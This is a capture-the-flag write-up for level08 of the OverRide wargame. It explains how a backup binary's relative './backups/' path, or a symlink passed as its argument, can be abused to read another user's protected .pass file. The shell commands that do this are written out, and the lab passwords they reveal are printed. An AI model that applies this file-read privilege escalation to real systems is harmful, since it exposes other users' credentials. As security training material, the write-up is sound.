# Hijacking relative path / Exploit symbolic link

```sh
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level08
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level08@192.168.56.101's password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

The program opens a file and creates its backup into `/home/users/level08/backups` by writing byte per byte.

The issue is that `./backups/` folder name is used as relative path. Relative path change depending on the working directory’s of the current location.

So the relative path can be hijacked by changing working directory to `/tmp` and creating a new `./backups/` folder containing absolute path of `.pass` of `level09`.

Other way is to create a symbolic link to `/home/users/level09/.pass` and pass to as argument to the binary.

## Exploit
By creating new `./backups/` folder in `/tmp`
```sh
level08@OverRide:/tmp$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
With symbolic link
```sh
level08@OverRide:~$ chmod +rwx .
level08@OverRide:~$ ln -s /home/users/level09/.pass pass
level08@OverRide:~$ ./level08 pass
level08@OverRide:~$ cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
